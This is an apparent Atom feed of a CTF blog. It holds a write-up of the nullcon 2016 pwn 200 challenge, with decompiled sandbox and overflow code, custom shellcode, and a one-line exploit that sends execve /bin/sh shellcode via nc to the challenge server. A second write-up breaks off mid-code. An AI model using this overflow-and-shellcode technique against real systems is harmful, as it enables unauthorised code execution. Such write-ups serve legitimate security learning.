<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[pwn_expoit Blog]]></title>
  <link href="http://mashirogod.github.io/atom.xml" rel="self"/>
  <link href="http://mashirogod.github.io/"/>
  <updated>2016-01-31T18:35:25-08:00</updated>
  <id>http://mashirogod.github.io/</id>
  <author>
    <name><![CDATA[pwn_expoit]]></name>
    <email><![CDATA[pwn_expoit@naver.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[2016 nullcon pwn 200]]></title>
    <link href="http://mashirogod.github.io/blog/2016/01/31/2016-nullcon-pwn-200/"/>
    <updated>2016-01-31T17:35:45-08:00</updated>
    <id>http://mashirogod.github.io/blog/2016/01/31/2016-nullcon-pwn-200</id>
    <content type="html"><![CDATA[<p>recently, I challenge nullcon 2016. when hold ctf, i catched pwnable.However, pwn 100 is arm exploit that i can&rsquo;t solve. So i decide to challengepwn 200.<br>
at frist, pwn 200 seem very easy:) . analyzing it, i think that this is sandbox. it was first time for me. <br></p>

<h2>Analysis<br></h2>

<p>this binary conserve with process using pipe. parent process could not exploit because it is sandbox that only use syscall(exit, read, write).
<br></p>

<figure class='code'><figcaption><span>[function] (parent.c)</span> <a href='http://mashirogod.github.io/codeview/parent.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">v11</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v11</span> <span class="p">)</span>
</span><span class='line'>      <span class="n">__assert_fail</span><span class="p">(</span><span class="s">&quot;psc != ((void *)0)&quot;</span><span class="p">,</span> <span class="s">&quot;sandman.c&quot;</span><span class="p">,</span> <span class="mh">0xCAu</span><span class="p">,</span> <span class="s">&quot;main&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">v13</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="n">buf</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">v3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v11</span><span class="p">[</span><span class="n">v13</span><span class="p">];</span>
</span><span class='line'>      <span class="n">v12</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">v13</span> <span class="o">+=</span> <span class="n">v12</span><span class="p">;</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">-=</span> <span class="n">v12</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span><span class='line'>      <span class="n">v10</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>        <span class="n">v12</span> <span class="o">=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>          <span class="n">v12</span> <span class="o">=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>          <span class="p">{</span>
</span><span class='line'>            <span class="n">v12</span> <span class="o">=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">60LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>              <span class="n">v12</span> <span class="o">=</span> <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">231LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>              <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>              <span class="p">{</span>
</span><span class='line'>                <span class="n">v5</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
</span><span class='line'>                <span class="n">v12</span> <span class="o">=</span> <span class="n">seccomp_load</span><span class="p">(</span><span class="n">v10</span><span class="p">);</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span><span class='line'>                <span class="p">{</span>
</span><span class='line'>                  <span class="n">v9</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
</span><span class='line'>                  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kr">__int64</span><span class="p">,</span> <span class="kt">signed</span> <span class="kr">__int64</span><span class="p">))</span><span class="n">v11</span><span class="p">)(</span><span class="n">v5</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">);</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>
<br>
parent process call custom function at final. in order to exploit, use to non sandbox(child process) So, i create assembly code to pipe write.
<br>
and then, i analyze child function. there are some inputs in child function.<br></p>

<h3>inputs in child function</h3>

<p>1st input: most input 0x0e<br>
2nd input: buffer size limited 0x1000<br>
3rd input: buffer had to start &ldquo;<a href="http://">http://</a>&rdquo; <----- heap buffer
<br>
<br></p>

<h2>Vulnerable</h2>

<p>after input, heap buffer(3rd input) is copied dest buffer(rbp-0x220).yet, heap buffer is possible 0x1000. it overwrite rip !!!! :)<br></p>

<figure class='code'><figcaption><span>[vuln] (child.c)</span> <a href='http://mashirogod.github.io/codeview/child.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_400BAC</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@1</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rax@4</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rax@6</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rax@9</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-220h]@9</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+210h] [bp-20h]@2</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [sp+218h] [bp-18h]@2</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// [sp+220h] [bp-10h]@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [sp+22Eh] [bp-2h]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v9</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_401194</span><span class="p">;</span>
</span><span class='line'>  <span class="n">result</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">&quot;http://&quot;</span><span class="p">,</span> <span class="mi">7uLL</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">nptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
</span><span class='line'>    <span class="n">v6</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">nptr</span> <span class="o">&gt;</span> <span class="n">v6</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">nptr</span> <span class="o">==</span> <span class="mh">0x3A</span> <span class="p">)</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>        <span class="n">v2</span> <span class="o">=</span> <span class="n">nptr</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>        <span class="o">*</span><span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">v9</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">nptr</span> <span class="o">==</span> <span class="mh">0x2F</span> <span class="p">)</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>        <span class="n">v3</span> <span class="o">=</span> <span class="n">nptr</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>        <span class="o">*</span><span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">v8</span> <span class="o">=</span> <span class="n">nptr</span><span class="p">;</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="o">++</span><span class="n">nptr</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">nptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
</span><span class='line'>    <span class="n">v4</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">7</span><span class="p">));</span>
</span><span class='line'>    <span class="n">strncpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">7</span><span class="p">),</span> <span class="n">v4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">sub_400B97</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><br>
However, finding shellcode address is very hard. on this account, i faild to solve pwn 200 during nullcon ctf<br></p>

<p>after finish ctf, i noticed that fork process share same address.<br>
<a href="http://stackoverflow.com/questions/5365580/fork-same-memory-addresses">http://stackoverflow.com/questions/5365580/fork-same-memory-addresses</a><br>
i saved stack. then stack overwrite rip :P.
<br></p>

<figure class='code'><figcaption><span>[shellcoding] (pipe.asm)</span> <a href='http://mashirogod.github.io/codeview/pipe.asm'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">%</span><span class="nf">define</span> <span class="no">FD</span> <span class="mi">4</span>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">lea</span> <span class="no">r9</span><span class="p">,</span> <span class="err">[</span><span class="no">rsp-0x100</span><span class="err">]</span>    <span class="err">&lt;</span><span class="p">------</span> <span class="no">save</span> <span class="no">stack</span>
</span><span class='line'>        <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span><span class="mi">0x602070</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'>        <span class="nf">syscall</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602068</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'>  <span class="nf">syscall</span>
</span><span class='line'>
</span><span class='line'>        <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span><span class="mi">0x4011f4</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'>        <span class="no">syscall</span>
</span><span class='line'>
</span><span class='line'>        <span class="no">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'>        <span class="no">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602008</span>
</span><span class='line'>        <span class="no">syscall</span>
</span><span class='line'>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">FD</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602008</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'>        <span class="no">syscall</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nf">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x600</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x500</span>
</span><span class='line'>  <span class="nf">syscall</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x234</span><span class="err">]</span><span class="p">,</span> <span class="no">r9</span> <span class="err">&lt;</span><span class="p">--------</span> <span class="no">overwrite</span> <span class="no">rip</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">FD</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x500</span>
</span><span class='line'>        <span class="no">syscall</span>
</span><span class='line'>        <span class="no">add</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x600</span>
</span><span class='line'>
</span><span class='line'>        <span class="no">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
</span><span class='line'>        <span class="no">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x6020b8</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">119</span>
</span><span class='line'>        <span class="no">syscall</span>
</span><span class='line'>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x6020B8</span>
</span><span class='line'>        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">119</span>
</span><span class='line'>        <span class="no">syscall</span>
</span></code></pre></td></tr></table></div></figure>


<p><br></p>

<h2>exploit</h2>

<figure class='code'><figcaption><span>[exploit] (exploit)</span> <a href='http://mashirogod.github.io/codeview/exploit'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="p">(</span><span class="vg">python</span><span class="w"> </span><span class="o">-</span><span class="vg">c</span><span class="w"> </span><span class="c1">&#39;print (&quot;\x0e&quot;)&#39;; python -c &#39;print (open(&quot;shell.bin&quot;).read()+&quot;A&quot;*2360)&#39;; python -c &#39;print (&quot;\x0e&quot;+&quot;\x60\x02\x00\x00&quot;+&quot;http://&quot;+&quot;\x90&quot;*(0x220-</span>
</span><span class='line'><span class="nl">49</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62&quot;</span><span class="o">+</span><span class="s2">&quot;\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31&quot;</span><span class="o">+</span><span class="err">&quot;</span><span class="o">\</span><span class="vg">xc0</span><span class="o">\</span><span class="vg">x50</span><span class="o">\</span><span class="vg">x57</span><span class="o">\</span><span class="vg">x48</span><span class="o">\</span><span class="vg">x89</span><span class="o">\</span><span class="vg">xe6</span><span class="o">\</span><span class="vg">xb0</span><span class="o">\</span><span class="vg">x3b</span><span class="o">\</span><span class="vg">x0</span>
</span><span class='line'><span class="vg">f</span><span class="o">\</span><span class="vg">x05</span><span class="o">\</span><span class="vg">x6a</span><span class="o">\</span><span class="vg">x01</span><span class="o">\</span><span class="vg">x5f</span><span class="o">\</span><span class="vg">x6a</span><span class="o">\</span><span class="vg">x3c</span><span class="s2">&quot;+&quot;</span><span class="o">\</span><span class="vg">x58</span><span class="o">\</span><span class="vg">x0f</span><span class="o">\</span><span class="vg">x05</span><span class="s2">&quot;+&quot;</span><span class="vg">C</span><span class="s2">&quot;*8+&quot;</span><span class="o">\</span><span class="vg">x6c</span><span class="o">\</span><span class="vg">x11</span><span class="o">\</span><span class="vg">x40</span><span class="s2">&quot;+&quot;</span><span class="o">\</span><span class="vg">x00</span><span class="err">&quot;</span><span class="o">*</span><span class="il">5</span><span class="p">)</span><span class="c1">&#39;;cat)|nc 52.72.171.221 9982</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[32c3 pwn[200] readme write up]]></title>
    <link href="http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up/"/>
    <updated>2015-12-31T07:16:00-08:00</updated>
    <id>http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up</id>
    <content type="html"><![CDATA[<p>after 32c3 ctf, i am sorry that sovled readme. so i challenge it again
this binary is likely to analysis,but i am too stupid to can&rsquo;t solved</p>

<figure class='code'><figcaption><span>[main func] (readmemain.c)</span> <a href='http://mashirogod.github.io/codeview/readmemain.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kr">__int64</span> <span class="nf">sub_4007E0</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx@2</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax@3</span>
